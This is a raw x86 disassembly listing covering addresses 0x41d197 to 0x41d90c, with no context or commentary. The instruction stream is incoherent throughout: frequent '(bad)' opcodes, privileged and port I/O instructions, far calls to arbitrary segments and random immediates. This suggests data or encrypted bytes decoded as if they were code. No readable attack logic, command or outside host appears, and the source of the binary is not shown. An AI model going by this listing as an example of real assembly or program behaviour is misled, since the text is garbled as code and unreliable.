  41d197:	popf   
  41d198:	mov    ebp,ebp
  41d19a:	xchg   edx,eax
  41d19b:	jae    0x41d190
  41d19d:	jae    0x41d13a
  41d19f:	jmp    0x41d16f
  41d1a1:	ins    DWORD PTR es:[edi],dx
  41d1a2:	pop    esp
  41d1a3:	jnp    0x41d208
  41d1a5:	jp     0x41d13a
  41d1a7:	call   0x8740e930
  41d1ac:	add    DWORD PTR [eax+0x17],esi
  41d1af:	cwde   
  41d1b0:	not    DWORD PTR [esi+0x79]
  41d1b3:	push   esi
  41d1b4:	push   eax
  41d1b5:	xchg   ecx,eax
  41d1b6:	sub    DWORD PTR [edi+0x3b7a0c3d],0x52b83821
  41d1c0:	push   eax
  41d1c1:	and    dh,ah
  41d1c3:	lea    esp,[edx+0x49]
  41d1c6:	call   0x5034:0x32972c
  41d1cd:	sahf   
  41d1ce:	es dec esp
  41d1d0:	mov    bh,0x8c
  41d1d2:	inc    edx
  41d1d3:	fimul  WORD PTR [edx-0x5f8756f6]
  41d1d9:	popf   
  41d1da:	and    eax,0x3548a534
  41d1df:	jmp    0x41d17b
  41d1e1:	scas   al,BYTE PTR es:[edi]
  41d1e2:	add    DWORD PTR [ecx-0x32f18b05],0x18af2bc4
  41d1ec:	xchg   DWORD PTR [ebx-0x488325c],edi
  41d1f2:	pop    ecx
  41d1f3:	mov    bl,BYTE PTR [esi]
  41d1f5:	inc    esi
  41d1f6:	mov    WORD PTR [edx-0x690c7a6d],fs
  41d1fc:	xor    eax,0xb8404a2a
  41d201:	xor    BYTE PTR [edx],0x1a
  41d204:	jno    0x41d20a
  41d206:	dec    ebp
  41d207:	fnstsw ax
  41d209:	xor    BYTE PTR [edx+0x79882d82],0x2d
  41d210:	jle    0x41d204
  41d212:	enter  0x2295,0x61
  41d216:	dec    ecx
  41d217:	sti    
  41d218:	push   esi
  41d219:	shl    DWORD PTR [ecx-0x2483f369],0xd4
  41d220:	cmp    BYTE PTR [ecx],bh
  41d222:	jbe    0x41d24e
  41d224:	cmp    BYTE PTR [ecx+0x60],dl
  41d227:	add    eax,DWORD PTR [ebp+eiz*2+0x49b9a2f0]
  41d22e:	push   ebp
  41d22f:	cmp    eax,0x38769c44
  41d234:	cmp    eax,0x69af7e54
  41d239:	sbb    eax,0xa291dc6c
  41d23e:	dec    ebx
  41d23f:	or     BYTE PTR [bp+di-0x3718],dh
  41d244:	scas   eax,DWORD PTR es:[edi]
  41d245:	repnz dec ecx
  41d247:	pop    eax
  41d248:	mov    al,0x81
  41d24a:	imul   edx,DWORD PTR [edi+ebp*4],0x1bc293f3
  41d251:	xlat   BYTE PTR ds:[ebx]
  41d252:	sbb    eax,0xd0d26629
  41d257:	div    DWORD PTR [eax]
  41d259:	jb     0x41d202
  41d25b:	sbb    bh,BYTE PTR [edx]
  41d25d:	ss add bh,dl
  41d260:	cmc    
  41d261:	rcl    DWORD PTR [eax],0x21
  41d264:	mov    dh,0x9f
  41d266:	mov    ebx,0xc9ed779e
  41d26b:	ds cs dec ebx
  41d26e:	ror    BYTE PTR [ecx+0x55],1
  41d271:	push   cs
  41d272:	jle    0x41d238
  41d274:	js     0x41d292
  41d276:	dec    edi
  41d277:	popf   
  41d278:	shl    cl,1
  41d27a:	arpl   WORD PTR [edi-0x5626a332],bp
  41d280:	mov    BYTE PTR [esi],0x62
  41d283:	std    
  41d284:	adc    ecx,ebx
  41d286:	fcomip st,st(6)
  41d288:	xlat   BYTE PTR ds:[ebx]
  41d289:	inc    esi
  41d28a:	test   al,0xd0
  41d28c:	div    DWORD PTR [edx-0x26]
  41d28f:	outs   dx,DWORD PTR ds:[esi]
  41d290:	dec    ecx
  41d291:	gs clc 
  41d293:	add    eax,0xe6cb0034
  41d298:	fld    DWORD PTR [edi+0x1d]
  41d29b:	scas   eax,DWORD PTR es:[edi]
  41d29c:	cmp    al,0x9e
  41d29e:	lods   al,BYTE PTR ds:[esi]
  41d29f:	xchg   ebp,eax
  41d2a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d2a1:	xchg   DWORD PTR [esi-0x44],ebx
  41d2a4:	fiadd  WORD PTR [esi+0x44]
  41d2a7:	xor    ebp,DWORD PTR [ebp*2+0x74df2c66]
  41d2ae:	mov    esi,0x26f3c5c7
  41d2b3:	xchg   esp,eax
  41d2b4:	ss xchg edx,eax
  41d2b6:	sbb    edx,esi
  41d2b8:	mov    eax,ds:0xb46a728a
  41d2bd:	popf   
  41d2be:	aad    0x7c
  41d2c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2c1:	hlt    
  41d2c2:	ret    0x9669
  41d2c5:	lds    esp,FWORD PTR [ebx+0x56bccc4f]
  41d2cb:	icebp  
  41d2cc:	mov    BYTE PTR [edi+0x7135832e],dl
  41d2d2:	mov    bl,0xc5
  41d2d4:	adc    ecx,DWORD PTR [esi-0x3da1272d]
  41d2da:	pop    ss
  41d2db:	bound  esi,QWORD PTR [ebx+0x79]
  41d2de:	clc    
  41d2df:	xchg   esi,eax
  41d2e0:	loope  0x41d2b6
  41d2e2:	stc    
  41d2e3:	jo     0x41d308
  41d2e5:	(bad)  
  41d2e6:	in     eax,0xf4
  41d2e8:	cmp    edx,ebx
  41d2ea:	daa    
  41d2eb:	push   0x3a
  41d2ed:	mov    bl,0xdb
  41d2ef:	mov    ah,0x5f
  41d2f1:	dec    ebp
  41d2f2:	stc    
  41d2f3:	adc    ecx,DWORD PTR [esi]
  41d2f5:	lea    edi,[ecx-0x452e5f6]
  41d2fb:	add    eax,0xb0254ec1
  41d300:	shl    DWORD PTR [edx+0x65],1
  41d303:	dec    esp
  41d304:	jmp    0xd088618f
  41d309:	(bad)
  41d30c:	ror    DWORD PTR [eax],0x9e
  41d30f:	cmp    DWORD PTR [edi+0xa],ebp
  41d312:	and    DWORD PTR [esi],ebp
  41d314:	push   ds
  41d315:	mov    al,0x2f
  41d317:	dec    edx
  41d318:	add    ch,BYTE PTR [edi]
  41d31a:	xchg   edx,eax
  41d31b:	addr16 add eax,0xb11842ff
  41d321:	sub    eax,DWORD PTR ds:[ebx-0x22b84fd0]
  41d328:	xlat   BYTE PTR ds:[ebx]
  41d329:	lods   al,BYTE PTR ds:[esi]
  41d32a:	stos   DWORD PTR es:[edi],eax
  41d32b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d32c:	sbb    al,0x68
  41d32e:	shr    BYTE PTR [edx-0x17],0x6f
  41d332:	(bad)  
  41d333:	(bad)  
  41d334:	aaa    
  41d335:	loop   0x41d2d3
  41d337:	jl     0x41d302
  41d339:	jecxz  0x41d321
  41d33b:	mov    eax,0x8dac2d39
  41d340:	imul   BYTE PTR [ebx]
  41d342:	shl    DWORD PTR [esi],0xd2
  41d345:	outs   dx,DWORD PTR ds:[esi]
  41d346:	xchg   DWORD PTR [edx-0x1d8c73f2],esi
  41d34c:	dec    esp
  41d34d:	xor    ch,bl
  41d34f:	pushf  
  41d350:	xor    al,0x34
  41d352:	push   edx
  41d353:	imul   ebx,DWORD PTR [edi+0x17d98697],0x92158d54
  41d35d:	or     eax,0xd244a1b4
  41d362:	push   ebp
  41d363:	xchg   BYTE PTR [edx],bh
  41d365:	out    dx,al
  41d366:	enter  0x51cd,0x28
  41d36a:	dec    esi
  41d36b:	hlt    
  41d36c:	dec    esp
  41d36d:	push   ebx
  41d36e:	jbe    0x41d309
  41d370:	out    0x10,al
  41d372:	rcl    edi,0xb7
  41d375:	iret   
  41d376:	fimul  DWORD PTR [esi-0x3cc71917]
  41d37c:	data16 cli 
  41d37e:	xchg   BYTE PTR [edx-0x4e555b02],bl
  41d384:	clc    
  41d385:	sbb    BYTE PTR [ebx+ebx*1-0x3a4f67ba],dh
  41d38c:	int    0x95
  41d38e:	out    0x47,al
  41d390:	sub    eax,0x41e1af74
  41d395:	push   ds
  41d396:	xchg   ecx,eax
  41d397:	aas    
  41d398:	sub    DWORD PTR [eax-0x66],0x35
  41d39c:	xlat   BYTE PTR ds:[ebx]
  41d39d:	xor    eax,0x9697b9f8
  41d3a2:	ds jp  0x41d361
  41d3a5:	xchg   ebx,eax
  41d3a6:	and    cl,dl
  41d3a8:	xor    BYTE PTR ds:0x7901c61b,ah
  41d3ae:	mov    dl,0xfc
  41d3b0:	repz out dx,al
  41d3b2:	lock xchg edx,eax
  41d3b4:	cli    
  41d3b5:	push   ebx
  41d3b6:	in     al,0x30
  41d3b8:	adc    BYTE PTR [esi],0xc4
  41d3bb:	add    ch,bl
  41d3bd:	ss xor eax,0xfaae966e
  41d3c3:	jbe    0x41d3b0
  41d3c5:	fwait
  41d3c6:	xor    ch,bl
  41d3c8:	xchg   ebx,eax
  41d3c9:	ss sbb eax,0x1df7044
  41d3cf:	dec    edi
  41d3d0:	ins    BYTE PTR es:[edi],dx
  41d3d1:	es add eax,0x2775e8b7
  41d3d7:	inc    ecx
  41d3d8:	xor    BYTE PTR [ebx+eiz*1],ch
  41d3db:	(bad)  
  41d3dc:	out    dx,eax
  41d3dd:	stc    
  41d3de:	mov    bl,0xa3
  41d3e0:	adc    BYTE PTR [eax+0x25],0x8
  41d3e4:	adc    al,0xfb
  41d3e6:	(bad)  
  41d3e7:	aam    0x61
  41d3e9:	outs   dx,DWORD PTR ds:[esi]
  41d3ea:	mov    ebx,DWORD PTR [edi-0x44]
  41d3ed:	mov    esp,0x44bf7ab9
  41d3f2:	call   0x7707:0xaac4ea96
  41d3f9:	sub    eax,0x61f39d14
  41d3fe:	pop    eax
  41d3ff:	and    eax,0x1adf41
  41d404:	bound  edi,QWORD PTR [ebp-0x6fc40607]
  41d40a:	dec    edx
  41d40b:	jg     0x41d3a5
  41d40d:	in     eax,0x49
  41d40f:	push   eax
  41d410:	fdivr  DWORD PTR [edx]
  41d412:	pop    edx
  41d413:	pop    ebx
  41d414:	out    0x2a,eax
  41d416:	test   eax,0x8fc3a791
  41d41b:	add    al,0xca
  41d41d:	mov    BYTE PTR [ebp+0x53887756],ch
  41d423:	neg    BYTE PTR [esi]
  41d425:	aad    0x33
  41d427:	xchg   ecx,eax
  41d428:	or     ecx,DWORD PTR [ebp-0x24]
  41d42b:	call   0xf6408669
  41d430:	push   0x14
  41d432:	adc    eax,DWORD PTR [esi+0x13]
  41d435:	ds jge 0x41d3c1
  41d438:	out    dx,al
  41d439:	ficomp DWORD PTR [ebx-0xcd09e4b]
  41d43f:	pop    edi
  41d440:	jecxz  0x41d4b8
  41d442:	es add al,ch
  41d445:	mov    bl,0xd5
  41d447:	mov    ds:0x8c90dbe0,eax
  41d44c:	jp     0x41d3f6
  41d44e:	jae    0x41d4bd
  41d450:	mov    bl,BYTE PTR [edi+0x167b9ebb]
  41d456:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d457:	les    ecx,FWORD PTR [esi-0x2759d48f]
  41d45d:	ficom  WORD PTR [edi-0x25]
  41d460:	pop    ss
  41d461:	sub    dl,BYTE PTR [eax-0x2daa3cf3]
  41d467:	xchg   ecx,eax
  41d468:	imul   eax,DWORD PTR [eax],0xda03ed6b
  41d46e:	cmp    bl,BYTE PTR [edx]
  41d470:	xlat   BYTE PTR ds:[ebx]
  41d471:	sar    BYTE PTR [ebx+eax*1],0xe8
  41d475:	ja     0x41d457
  41d477:	shl    DWORD PTR [eax],1
  41d479:	add    al,0x7f
  41d47b:	not    BYTE PTR [ebx+0x3af697d]
  41d481:	push   esp
  41d482:	add    eax,0x6986e357
  41d487:	shl    BYTE PTR [edx],cl
  41d489:	push   ebx
  41d48a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d48b:	pusha  
  41d48c:	xor    eax,0xb0acbb25
  41d491:	pop    ebx
  41d492:	mov    ecx,0x6d7986ac
  41d497:	inc    edi
  41d498:	aam    0x28
  41d49a:	imul   edx,ebx,0x6
  41d49d:	pop    eax
  41d49e:	leave  
  41d49f:	je     0x41d466
  41d4a1:	sbb    esi,0x47
  41d4a4:	and    edi,DWORD PTR [ebx-0x66e2e70b]
  41d4aa:	xchg   esi,eax
  41d4ab:	mov    cl,0xa2
  41d4ad:	jge    0x41d52c
  41d4af:	sbb    eax,0x6c97331f
  41d4b4:	add    BYTE PTR [ecx+0x7a],ch
  41d4b7:	nop
  41d4b8:	div    DWORD PTR es:[edx]
  41d4bb:	and    bh,BYTE PTR [esp-0x6f75d652]
  41d4c2:	cdq    
  41d4c3:	pushf  
  41d4c4:	nop
  41d4c5:	rcr    BYTE PTR [eax-0x11],0x8c
  41d4c9:	sub    DWORD PTR [esi+0x4e48ba6],0x444369dd
  41d4d3:	mov    esp,0xfb451368
  41d4d8:	jmp    0x41d48e
  41d4da:	add    eax,0xc0fc8da2
  41d4df:	and    esp,ecx
  41d4e1:	lods   eax,DWORD PTR ds:[esi]
  41d4e2:	test   al,0x40
  41d4e4:	cmp    BYTE PTR [esi],0x93
  41d4e7:	mov    edi,0xeaebe164
  41d4ec:	xchg   esi,eax
  41d4ed:	idiv   ebp
  41d4ef:	push   0x3f
  41d4f1:	retf   0xd5d3
  41d4f4:	mov    al,ds:0x342fec2c
  41d4f9:	dec    ebx
  41d4fa:	retf   0x928e
  41d4fd:	ficomp DWORD PTR [eax]
  41d4ff:	fcomp  QWORD PTR [edx]
  41d501:	xchg   ebx,eax
  41d502:	add    ecx,DWORD PTR [eax+0x2f]
  41d505:	pop    ss
  41d506:	jne    0x41d548
  41d508:	retf   
  41d509:	pop    DWORD PTR [ebx+0x36]
  41d50c:	cmp    eax,0x73ae5ae8
  41d511:	cmp    eax,0xdea5ba32
  41d516:	mov    eax,esp
  41d518:	mov    BYTE PTR [edx+0x3d],cl
  41d51b:	adc    al,0x27
  41d51d:	pop    ss
  41d51e:	pop    ebp
  41d51f:	dec    dx
  41d521:	mov    al,0x35
  41d523:	stc    
  41d524:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d525:	(bad)  
  41d526:	stc    
  41d527:	jne    0x41d502
  41d529:	xor    DWORD PTR [esp+edx*2],esp
  41d52c:	pop    edi
  41d52d:	test   al,0x6a
  41d52f:	dec    ecx
  41d530:	(bad)  
  41d531:	mov    ah,0x77
  41d533:	xchg   edx,eax
  41d534:	sub    DWORD PTR [eax-0x169d4f09],eax
  41d53a:	inc    esi
  41d53b:	jb     0x41d555
  41d53d:	pusha  
  41d53e:	cdq    
  41d53f:	je     0x41d542
  41d541:	test   esp,0xcedbdc5a
  41d547:	fisub  DWORD PTR [edi]
  41d549:	dec    esp
  41d54a:	or     eax,ebx
  41d54c:	or     eax,0x27d0304f
  41d551:	(bad)  
  41d552:	int    0x19
  41d554:	fistp  WORD PTR [eax-0x61]
  41d557:	test   eax,0x752cf1a8
  41d55c:	dec    BYTE PTR ds:0x23dac7c6
  41d562:	push   edi
  41d563:	sub    eax,0xfb37ab56
  41d568:	or     al,0x61
  41d56a:	lods   eax,DWORD PTR gs:[esi]
  41d56c:	sub    al,0xcd
  41d56e:	fistp  QWORD PTR [eax]
  41d570:	std    
  41d571:	mov    ecx,DWORD PTR [edx-0xed6a514]
  41d577:	test   BYTE PTR [edi],bl
  41d579:	imul   ebx,DWORD PTR fs:[edi+0x22],0x27
  41d57e:	mov    ds:0x49f7febc,eax
  41d583:	cwde   
  41d584:	and    ebp,DWORD PTR [edi]
  41d586:	pop    edi
  41d587:	inc    ebp
  41d588:	mov    cs,WORD PTR [ebp+0x5fc8e278]
  41d58e:	bound  esp,QWORD PTR [esi-0x27]
  41d591:	hlt    
  41d592:	dec    BYTE PTR [esi+0x6ef6bcca]
  41d598:	or     al,0x4f
  41d59a:	data16 aad 0xb6
  41d59d:	sahf   
  41d59e:	popf   
  41d59f:	sbb    edx,DWORD PTR [edi]
  41d5a1:	shl    BYTE PTR [ebx+edi*8-0xd8cb06],cl
  41d5a8:	jge    0x41d5de
  41d5aa:	hlt    
  41d5ab:	shr    BYTE PTR [edi+0x4b],cl
  41d5ae:	sbb    ebx,DWORD PTR [ebp+0x52]
  41d5b1:	test   DWORD PTR [ebp-0x7ef91b19],0x6b1475ca
  41d5bb:	loopne 0x41d554
  41d5bd:	xor    DWORD PTR [ebx],ebx
  41d5bf:	leave  
  41d5c0:	sbb    DWORD PTR [edi+0x61e092eb],esi
  41d5c6:	ja     0x41d645
  41d5c8:	cmp    esi,DWORD PTR [edx]
  41d5ca:	mov    cl,BYTE PTR [ebp+0x5c]
  41d5cd:	inc    ecx
  41d5ce:	sti    
  41d5cf:	call   0x6f18:0x476b50ea
  41d5d6:	(bad)  
  41d5d7:	neg    bh
  41d5d9:	dec    esp
  41d5da:	repz inc ebp
  41d5dc:	into   
  41d5dd:	rol    DWORD PTR [ebx],1
  41d5df:	pop    ebp
  41d5e0:	jb     0x41d5f3
  41d5e2:	dec    ecx
  41d5e3:	inc    ebx
  41d5e4:	ds jmp 0x3e24b9c2
  41d5ea:	sar    DWORD PTR [esi-0x128357cc],0xa5
  41d5f1:	clc    
  41d5f2:	out    0xa,eax
  41d5f4:	rcl    dl,1
  41d5f6:	stos   BYTE PTR es:[edi],al
  41d5f7:	imul   esp,DWORD PTR [edx+0x620ed0f4],0xfce19f40
  41d601:	daa    
  41d602:	xchg   DWORD PTR [bx+di],eax
  41d605:	enter  0x9cdd,0x2f
  41d609:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d60a:	add    BYTE PTR [eax],dl
  41d60c:	push   es
  41d60d:	pop    edi
  41d60e:	sub    al,0xed
  41d610:	sub    al,0x88
  41d612:	test   al,0x7e
  41d614:	push   ebx
  41d615:	ret    
  41d616:	cli    
  41d617:	test   eax,0x31a88e74
  41d61c:	xchg   DWORD PTR [ecx+ebx*1],eax
  41d61f:	mov    cl,0x4d
  41d621:	clc    
  41d622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d623:	mov    ah,0x94
  41d625:	cmp    al,0x7c
  41d627:	jp     0x41d679
  41d629:	hlt    
  41d62a:	xchg   DWORD PTR [edx+eiz*1+0x75],ebx
  41d62e:	cwde   
  41d62f:	mov    bl,0x2e
  41d631:	pop    ebp
  41d632:	and    bh,BYTE PTR [edx]
  41d634:	or     al,0xd2
  41d636:	cmp    BYTE PTR ss:[edx+0x7651a626],0xb0
  41d63e:	aam    0x59
  41d640:	scas   al,BYTE PTR es:[edi]
  41d641:	xlat   BYTE PTR ds:[ebx]
  41d642:	lods   al,BYTE PTR ds:[esi]
  41d643:	inc    edx
  41d644:	sub    al,0xf7
  41d646:	add    eax,0x336e3e98
  41d64b:	jae    0x41d6a0
  41d64d:	adc    eax,DWORD PTR [esi-0x39]
  41d650:	adc    ecx,DWORD PTR [esi]
  41d652:	cmp    BYTE PTR [ecx-0xa2a55ea],dl
  41d658:	into   
  41d659:	dec    eax
  41d65a:	push   edx
  41d65b:	psubusb mm6,mm7
  41d65e:	pushf  
  41d65f:	loop   0x41d651
  41d661:	mov    eax,ds:0xc1e6c44
  41d666:	aam    0x43
  41d668:	xor    al,0x1f
  41d66a:	pop    ebx
  41d66b:	loop   0x41d632
  41d66d:	cmp    BYTE PTR [ebx],al
  41d66f:	fmulp  st(4),st
  41d671:	lea    ebx,[edi+0x189420cd]
  41d677:	inc    edx
  41d678:	mov    ds:0x2efeabeb,eax
  41d67d:	add    al,0xba
  41d67f:	jg     0x41d6f9
  41d681:	popf   
  41d682:	sbb    eax,0x845a7f68
  41d687:	add    edi,DWORD PTR [esi]
  41d689:	push   0x5524cde9
  41d68e:	cmp    edi,edi
  41d690:	xchg   edi,eax
  41d691:	stc    
  41d692:	fs ret 
  41d694:	loopne 0x41d68d
  41d696:	sbb    ebx,esi
  41d698:	pop    ss
  41d699:	mov    edi,gs
  41d69b:	stc    
  41d69c:	push   cs
  41d69d:	mov    DWORD PTR [edx+0x1924550],esp
  41d6a3:	push   cs
  41d6a4:	sar    cl,0x2a
  41d6a7:	dec    edi
  41d6a8:	dec    ebx
  41d6a9:	mov    BYTE PTR [eax],0x7d
  41d6ac:	jg     0x41d717
  41d6ae:	das    
  41d6af:	xchg   ebx,eax
  41d6b0:	adc    eax,0x23f57430
  41d6b5:	adc    cl,ah
  41d6b7:	pop    eax
  41d6b8:	mov    dl,0xcf
  41d6ba:	inc    ebx
  41d6bb:	ins    BYTE PTR es:[edi],dx
  41d6bc:	cmp    eax,0x32b9352a
  41d6c1:	test   BYTE PTR [ecx-0x5e],al
  41d6c4:	or     bl,0xcc
  41d6c7:	(bad)  [esi-0xe6adffa]
  41d6cd:	stos   DWORD PTR es:[edi],eax
  41d6ce:	lahf   
  41d6cf:	pop    esi
  41d6d0:	sub    al,0x6b
  41d6d2:	inc    eax
  41d6d3:	cli    
  41d6d4:	(bad)  
  41d6d5:	jge    0x41d744
  41d6d7:	sbb    BYTE PTR [ecx+0x2c62e741],bh
  41d6dd:	rcr    DWORD PTR [eax],0x74
  41d6e0:	dec    ebx
  41d6e1:	scas   eax,DWORD PTR es:[edi]
  41d6e2:	sub    esi,eax
  41d6e4:	xor    eax,0xa226e0be
  41d6e9:	sbb    esi,DWORD PTR [edi-0x67]
  41d6ec:	add    BYTE PTR ds:0xe1dd5254,bl
  41d6f2:	xchg   esp,eax
  41d6f3:	leave  
  41d6f4:	xor    al,0xb1
  41d6f6:	bound  ebx,QWORD PTR [ebx]
  41d6f8:	dec    eax
  41d6f9:	mov    ds:0xf3b59712,al
  41d6fe:	bound  eax,QWORD PTR [edx-0x21da8ae1]
  41d704:	sub    ebx,DWORD PTR [eax+0x766b5655]
  41d70a:	stc    
  41d70b:	hlt    
  41d70c:	push   cs
  41d70d:	and    al,0xd2
  41d70f:	sub    eax,0xff73e619
  41d714:	pop    ss
  41d715:	mov    dh,0x71
  41d717:	xchg   esp,eax
  41d718:	test   BYTE PTR ds:0xf5d9cd1,0x1f
  41d71f:	xchg   edi,eax
  41d720:	imul   ebp,DWORD PTR [eax+0x43],0x34bd5bae
  41d727:	ins    BYTE PTR es:[edi],dx
  41d728:	sar    BYTE PTR [edx+0x49],cl
  41d72b:	inc    esp
  41d72c:	addr16 aaa 
  41d72e:	jmp    0x2f5c5832
  41d733:	push   eax
  41d734:	sub    al,al
  41d736:	stos   DWORD PTR es:[edi],eax
  41d737:	push   esi
  41d738:	adc    DWORD PTR [ebx-0x40],ebx
  41d73b:	lds    esp,FWORD PTR [ecx]
  41d73d:	cmp    eax,0xa70b1b18
  41d742:	mov    dl,BYTE PTR [edx+0x352f52f1]
  41d748:	sub    edx,DWORD PTR [ebp-0x5329afca]
  41d74e:	ja     0x41d763
  41d750:	inc    ebx
  41d751:	sub    edi,DWORD PTR [ebp-0x3e01834e]
  41d757:	daa    
  41d758:	pop    eax
  41d759:	pop    esp
  41d75a:	xor    dl,BYTE PTR [ebx-0x3413a0ec]
  41d760:	imul   esp,DWORD PTR [ebp+esi*1+0x3a4ae576],0x0
  41d768:	jmp    0x4a5ecd30
  41d76d:	pop    ds
  41d76e:	ins    BYTE PTR es:[edi],dx
  41d76f:	or     DWORD PTR [esi-0x1378084b],eax
  41d775:	jnp    0x41d76a
  41d777:	push   cs
  41d778:	int3   
  41d779:	cwde   
  41d77a:	jne    0x41d7b0
  41d77c:	jg     0x41d747
  41d77e:	call   0x6976:0x5b20cff5
  41d785:	mov    bl,0x23
  41d787:	adc    edi,0xa0277112
  41d78d:	into   
  41d78e:	fsub   QWORD PTR [edx]
  41d790:	mov    cl,0xaf
  41d792:	lahf   
  41d793:	out    0x12,eax
  41d795:	mov    ah,0x1a
  41d797:	mov    cl,0x48
  41d799:	pop    esi
  41d79a:	mov    edi,DWORD PTR [ebp+0x44]
  41d79d:	xchg   ecx,eax
  41d79e:	cmpxchg DWORD PTR [edi-0x36b7c154],ebx
  41d7a5:	in     eax,dx
  41d7a6:	test   eax,0x746359fb
  41d7ab:	jae    0x41d802
  41d7ad:	mov    cl,BYTE PTR [ebx]
  41d7af:	mov    ds:0x390abdf3,eax
  41d7b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7b5:	into   
  41d7b6:	cmp    dl,BYTE PTR [eax]
  41d7b8:	pop    ecx
  41d7b9:	mov    ah,0x3
  41d7bb:	sub    al,0x1f
  41d7bd:	sub    eax,0x65461950
  41d7c2:	fadd   st(2),st
  41d7c4:	imul   esi,DWORD PTR [ebp-0x4ace5e6f],0xdffb9174
  41d7ce:	fucomip st,st(6)
  41d7d0:	scas   al,BYTE PTR es:[edi]
  41d7d1:	outs   dx,BYTE PTR ds:[esi]
  41d7d2:	pushf  
  41d7d3:	jns    0x41d7f8
  41d7d5:	add    BYTE PTR [ecx+0x4f],cl
  41d7d8:	pop    esp
  41d7d9:	or     edi,esi
  41d7db:	dec    eax
  41d7dc:	sqrtps xmm4,XMMWORD PTR [ebx]
  41d7df:	fisttp DWORD PTR [edi]
  41d7e1:	inc    esi
  41d7e2:	mov    esi,0x86c7f85
  41d7e7:	sbb    BYTE PTR [ebp+0x47],bh
  41d7ea:	bound  esp,QWORD PTR ds:0x282a982a
  41d7f0:	lods   al,BYTE PTR ds:[esi]
  41d7f1:	or     al,0x15
  41d7f3:	dec    ebp
  41d7f4:	xor    al,0x21
  41d7f6:	cmp    bl,bh
  41d7f8:	cmc    
  41d7f9:	push   ecx
  41d7fa:	repnz mov ch,0xc
  41d7fd:	out    dx,al
  41d7fe:	je     0x41d874
  41d800:	ss or  eax,0x495de208
  41d806:	and    edx,DWORD PTR [edx]
  41d808:	sbb    BYTE PTR [eax],0x33
  41d80b:	push   0x37
  41d80d:	adc    eax,0xe117ea3c
  41d812:	jno    0x41d876
  41d814:	adc    dh,BYTE PTR [edx]
  41d816:	xor    DWORD PTR [eax+0x2d],ecx
  41d819:	stos   BYTE PTR es:[edi],al
  41d81a:	es pop es
  41d81c:	dec    eax
  41d81d:	mov    ecx,0x7d5ae293
  41d822:	cmp    ecx,DWORD PTR [ebx+ebx*2]
  41d825:	hlt    
  41d826:	ja     0x41d80d
  41d828:	ret    
  41d829:	retf   
  41d82a:	xchg   esp,eax
  41d82b:	sub    eax,0x6dcf67ee
  41d830:	inc    esp
  41d831:	test   al,0xb7
  41d833:	(bad)  
  41d834:	mov    ebx,0xe0b25df6
  41d839:	repz mov ecx,DWORD PTR [eax+0x4]
  41d83d:	cdq    
  41d83e:	push   es
  41d83f:	sbb    ch,BYTE PTR [ebx]
  41d841:	rol    DWORD PTR [ebx+0x28],1
  41d844:	ja     0x41d80f
  41d846:	xchg   BYTE PTR [ebp+0x7c],ch
  41d849:	jb     0x41d7f8
  41d84b:	fnstsw WORD PTR [esi]
  41d84d:	pop    ds
  41d84e:	adc    DWORD PTR [edi],esp
  41d850:	(bad)  
  41d851:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d852:	xchg   ebp,eax
  41d853:	xlat   BYTE PTR ds:[ebx]
  41d854:	in     eax,dx
  41d855:	inc    ebp
  41d856:	loope  0x41d7f7
  41d858:	adc    BYTE PTR [edx],0xa3
  41d85b:	lea    esp,[ecx]
  41d85d:	sub    BYTE PTR [esi+edi*2-0x62],0x5f
  41d862:	dec    cx
  41d864:	sahf   
  41d865:	jo     0x41d898
  41d867:	dec    edi
  41d868:	daa    
  41d869:	push   es
  41d86a:	sub    DWORD PTR [esi],ecx
  41d86c:	jmp    0x31a2:0x385ad814
  41d873:	mov    al,ds:0x5a1813e0
  41d878:	sub    al,0xf1
  41d87a:	dec    esp
  41d87b:	and    al,0xbd
  41d87d:	fisttp WORD PTR [eax+0x2b]
  41d880:	jbe    0x41d86c
  41d882:	aas    
  41d883:	fnstenv [edx-0x2fdeb974]
  41d889:	cmp    ah,BYTE PTR [eax+0x136297ea]
  41d88f:	ja     0x41d811
  41d891:	inc    eax
  41d892:	add    al,0x79
  41d894:	xchg   ecx,eax
  41d895:	add    BYTE PTR [esi],0xbc
  41d898:	inc    esi
  41d899:	out    dx,ax
  41d89b:	jmp    0xf638:0xbe9265f3
  41d8a2:	test   eax,0x4350b5b3
  41d8a7:	stos   DWORD PTR es:[edi],eax
  41d8a8:	adc    eax,0x2b768c7b
  41d8ad:	mov    al,0x3f
  41d8af:	push   edi
  41d8b0:	xchg   esi,eax
  41d8b1:	lods   eax,DWORD PTR ds:[esi]
  41d8b2:	xor    DWORD PTR [eax+0x61893a0f],eax
  41d8b8:	pop    ebx
  41d8b9:	xor    cl,bh
  41d8bb:	inc    ebp
  41d8bc:	outs   dx,BYTE PTR ds:[esi]
  41d8bd:	cmp    edi,DWORD PTR [edi]
  41d8bf:	stos   BYTE PTR es:[edi],al
  41d8c0:	xor    al,0x1b
  41d8c2:	fs mov bl,0xb0
  41d8c5:	out    dx,al
  41d8c6:	mov    BYTE PTR [edi],ah
  41d8c8:	dec    edx
  41d8c9:	dec    edi
  41d8ca:	dec    ebp
  41d8cb:	ret    0xbb43
  41d8ce:	jb     0x41d883
  41d8d0:	or     al,BYTE PTR [ebp+0x50]
  41d8d3:	(bad)  
  41d8d4:	jo     0x41d8ba
  41d8d6:	or     al,0xda
  41d8d8:	mov    edx,0xd671f6b6
  41d8dd:	cmp    eax,0x7910db97
  41d8e2:	in     eax,dx
  41d8e3:	jmp    0x7e99:0xf4ee299e
  41d8ea:	add    DWORD PTR [ebx],edx
  41d8ec:	lahf   
  41d8ed:	inc    edi
  41d8ee:	jg     0x41d91a
  41d8f0:	mov    dh,ch
  41d8f2:	jbe    0x41d87d
  41d8f4:	fwait
  41d8f5:	jns    0x41d8bb
  41d8f7:	and    BYTE PTR [edx-0x27],ch
  41d8fa:	inc    ebx
  41d8fb:	add    eax,0x3e978c90
  41d900:	adc    ebp,ecx
  41d902:	test   BYTE PTR [eax],0x65
  41d905:	cmp    ebx,DWORD PTR [ecx-0x459d21d5]
  41d90b:	xchg   esp,eax
  41d90c:	retf   0x9ce3
